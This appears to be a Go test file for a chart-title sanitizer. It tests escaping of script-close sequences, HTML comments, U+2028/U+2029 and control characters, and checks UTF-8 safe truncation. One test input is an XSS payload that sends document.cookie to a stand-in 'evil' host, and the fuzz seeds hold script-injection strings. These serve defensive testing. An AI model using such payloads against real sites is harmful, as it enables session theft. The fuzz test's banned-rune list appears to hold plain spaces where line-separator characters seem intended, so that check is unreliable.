package chart

import (
	"encoding/json"
	"strings"
	"testing"
	"unicode/utf8"
)

func TestSanitizeChartString_BlocksScriptClose(t *testing.T) {
	tests := []struct {
		name string
		in   string
		// must not appear (un-escaped) in output
		bannedSubstring []string
		// must remain (sanitize doesn't strip safe text)
		mustContain []string
	}{
		{
			name:            "exit-script payload",
			in:              "Title</script><script>fetch('http://evil/'+document.cookie)</script>",
			bannedSubstring: []string{"</script>", "</script"},
			mustContain:     []string{"Title", "<\\/script", "fetch"},
		},
		{
			name:            "html comment payload",
			in:              "</title><style>body{display:none}</style>",
			bannedSubstring: []string{"</title>", "</style>"},
			mustContain:     []string{"<\\/title", "<\\/style"},
		},
		{
			name:            "control char smuggling",
			in:              "Hello\x00World\x1bABC",
			bannedSubstring: []string{"\x00", "\x1b"},
			mustContain:     []string{"Hello", "World", "ABC"},
		},
		{
			name:            "normal EMG header passes through",
			in:              "R.TA&IO: EMG 7 (from SF8) ->Filter->RMS []",
			bannedSubstring: nil,
			mustContain:     []string{"R.TA&IO", "EMG 7", "Filter", "RMS"},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := SanitizeChartString(tc.in)
			for _, banned := range tc.bannedSubstring {
				if strings.Contains(got, banned) {
					t.Errorf("output should not contain %q\ngot: %q", banned, got)
				}
			}
			for _, must := range tc.mustContain {
				if !strings.Contains(got, must) {
					t.Errorf("output should contain %q\ngot: %q", must, got)
				}
			}
		})
	}
}

func TestSanitizeChartString_LengthCap(t *testing.T) {
	in := strings.Repeat("a", 2000)
	got := SanitizeChartString(in)
	if len(got) > 1024 {
		t.Errorf("expected length cap at 1024, got %d", len(got))
	}
}

// TestSanitizeChartString_CJKTruncation_NoMojibake 釘住
// 1024-byte 硬切在 CJK rune 中段 (中=E4 B8 AD 共 3 bytes) 會留下不完整序列;
// Go range loop 把 invalid byte 解成 U+FFFD (replacement char "�"),導致 user
// 看到圖表 title 結尾出現 mojibake。修法是切完後過 strings.ToValidUTF8(s, "")
// 把尾端 incomplete sequence 拋掉。
func TestSanitizeChartString_CJKTruncation_NoMojibake(t *testing.T) {
	// 400 個「中」字 = 1200 bytes (每字 3 bytes),硬切 1024 後最後一個 byte 是
	// rune 的第 1 byte,缺後 2 bytes。
	in := strings.Repeat("中", 400)
	got := SanitizeChartString(in)

	if !utf8.ValidString(got) {
		t.Errorf("output is not valid UTF-8 after truncation\noutput=%q", got)
	}

	if strings.ContainsRune(got, utf8.RuneError) {
		t.Errorf("output contains U+FFFD (mojibake '�') after truncation\noutput=%q", got)
	}

	if len(got) > 1024 {
		t.Errorf("expected length cap at 1024, got %d", len(got))
	}
}

// TestSanitizeChartString_HTMLCommentInjection 釘住 sanitize 必須
// 把 `<!--` 中的 `<!` 字串改寫，否則嵌進 <script> 後 HTML parser 會以為
// script body 進入 comment 狀態，攻擊者可挾帶任意 payload 到 `-->` 為止。
func TestSanitizeChartString_HTMLCommentInjection(t *testing.T) {
	tests := []struct {
		name        string
		in          string
		bannedPlain []string
		mustContain []string
	}{
		{
			name:        "open html comment escape",
			in:          "Title<!--evil-->",
			bannedPlain: []string{"<!--"},
			mustContain: []string{"<\\!--", "Title"},
		},
		{
			name:        "html comment with script close attempt",
			in:          "<!--</script>evil-->",
			bannedPlain: []string{"<!--", "</script>"},
			mustContain: []string{"<\\!--", "<\\/script>"},
		},
		{
			name:        "lone <! retained but escaped",
			in:          "x<!y",
			bannedPlain: []string{"<!"},
			mustContain: []string{"<\\!"},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := SanitizeChartString(tc.in)
			for _, banned := range tc.bannedPlain {
				if strings.Contains(got, banned) {
					t.Errorf("output must not contain %q\ngot: %q", banned, got)
				}
			}
			for _, must := range tc.mustContain {
				if !strings.Contains(got, must) {
					t.Errorf("output must contain %q\ngot: %q", must, got)
				}
			}
		})
	}
}

// TestSanitizeChartString_JSLineTerminators 釘住 U+2028 / U+2029
// 在 <script> 內的 JSON 字串會被 V8 / Safari 等 engine 視為 statement
// terminator,可破出字串並執行後續 token。sanitize 必須把 raw codepoint 替換
// 成 \uXXXX literal 字串。`unicode.IsControl` 不認這兩個 codepoint
// (它們是 Zl / Zp category),因此舊版單純剔除 control char 的路徑會漏。
//
// 6-byte literal constants：避免 source 直接含 raw U+2028 / U+2029
// 干擾 grep / diff / IDE 顯示。`ls` / `ps` 是 sanitize 後預期 output 子字串。
func TestSanitizeChartString_JSLineTerminators(t *testing.T) {
	// sanitize 後預期 output 應包含的 6-byte ASCII literal 字串 (反斜線 + u + 2 + 0 + 2 + 8/9).
	// 在 Go source 用 "\\u2028" 雙反斜線寫出來,讓 compile-time 解析後是 literal 6 ASCII bytes.
	const ls = "\\u2028"
	const ps = "\\u2029"
	// rawLS / rawPS 是真實 U+2028 / U+2029 codepoint,用 Go escape "\u2028" 形式
	// 避免 source 內直接出現 raw codepoint(便於 grep / diff / IDE 視覺化).
	const rawLS = "\u2028"
	const rawPS = "\u2029"

	tests := []struct {
		name        string
		in          string
		bannedRunes []rune
		mustContain []string
	}{
		{
			name:        "U+2028 line separator",
			in:          "Title" + rawLS + "evil",
			bannedRunes: []rune{'\u2028'},
			mustContain: []string{ls, "Title", "evil"},
		},
		{
			name:        "U+2029 paragraph separator",
			in:          "Title" + rawPS + "evil",
			bannedRunes: []rune{'\u2029'},
			mustContain: []string{ps, "Title", "evil"},
		},
		{
			name:        "mixed both terminators",
			in:          "A" + rawLS + "B" + rawPS + "C",
			bannedRunes: []rune{'\u2028', '\u2029'},
			mustContain: []string{ls, ps, "A", "B", "C"},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := SanitizeChartString(tc.in)
			for _, banned := range tc.bannedRunes {
				if strings.ContainsRune(got, banned) {
					t.Errorf("output must not contain raw rune %U\ngot: %q", banned, got)
				}
			}
			for _, must := range tc.mustContain {
				if !strings.Contains(got, must) {
					t.Errorf("output must contain %q\ngot: %q", must, got)
				}
			}
		})
	}
}

// FuzzSanitizeChartString 是 的 property-based 守門：
//   - output 絕不能保留 raw `</`、`<!--`、U+2028、U+2029 序列
//   - output 必須是 valid UTF-8（sanitize 不能產生 invalid 序列導致下游
//     json.Marshal panic）
//   - 把 output 用 json.Marshal 包再 Unmarshal 必須 round-trip 等價（守
//     escape 沒破壞既有 JSON-string 對稱性）
//
// 跑法：go test -fuzz=FuzzSanitizeChartString -fuzztime=30s ./internal/chart/...
func FuzzSanitizeChartString(f *testing.F) {
	// Seed corpus — 涵蓋 描述的所有 attack vector 與既有 baseline。
	seeds := []string{
		"",
		"normal title",
		"Title</script><script>alert(1)</script>",
		"<!--evil-->",
		"<!--</script>x-->",
		"line1 line2",
		"para1 para2",
		"mix<!-- </script> -->",
		"\x00\x1b control smuggle",
		"\xff\xfe invalid utf8 sequence",
		strings.Repeat("a", 2048),                // length cap exercise
		"中文 Title with 全形 = 符號",                  // multilingual baseline
		"\"quote\" and \\backslash",              // JSON-significant chars
		"<\\/already escaped<\\!already escaped", // double-pass idempotence
	}
	for _, s := range seeds {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, in string) {
		got := SanitizeChartString(in)

		// 1. 長度 cap：1024 byte slice 後再 escape 可能略微膨脹（每個 `</`
		//    膨脹為 `<\/` 多 1 byte，每個 U+2028 從 3 bytes 變 6 bytes 字串），
		//    但仍應遠小於合理上界（4 * 1024 已是極端 case 上界）。
		const maxExpandedLen = 4 * 1024
		if len(got) > maxExpandedLen {
			t.Errorf("output exceeded expanded length cap: len=%d", len(got))
		}

		// 2. Banned raw sequences — 任一存在即代表 escape 漏網。
		bannedPlain := []string{"</", "<!--"}
		for _, banned := range bannedPlain {
			if strings.Contains(got, banned) {
				t.Errorf("output retained banned plain substring %q\ninput=%q\noutput=%q",
					banned, in, got)
			}
		}
		bannedRunes := []rune{' ', ' ', 0}
		for _, banned := range bannedRunes {
			if strings.ContainsRune(got, banned) {
				t.Errorf("output retained banned raw rune %U\ninput=%q\noutput=%q",
					banned, in, got)
			}
		}

		// 3. output 必須是 valid UTF-8（builder loop 用 WriteRune；invalid
		//    input 已被 unicode.IsControl loop 剔除大部分，但 fuzz 會餵
		//    invalid bytes，sanitize 應吐 valid UTF-8 給下游 json.Marshal）。
		if !utf8.ValidString(got) {
			t.Errorf("output is not valid UTF-8\ninput=%q\noutput=%q", in, got)
		}

		// 4. JSON round-trip：把 sanitized output 當 JSON string marshal /
		//    unmarshal 必須無錯。守 escape 沒破壞 JSON 字元集對稱性。
		marshaled, err := json.Marshal(got)
		if err != nil {
			t.Errorf("json.Marshal failed on sanitized output: %v\noutput=%q",
				err, got)
			return
		}
		var back string
		if err := json.Unmarshal(marshaled, &back); err != nil {
			t.Errorf("json.Unmarshal failed on marshaled output: %v\nmarshaled=%s",
				err, string(marshaled))
		}
		if back != got {
			t.Errorf("JSON round-trip mismatch:\nbefore=%q\nafter=%q", got, back)
		}
	})
}
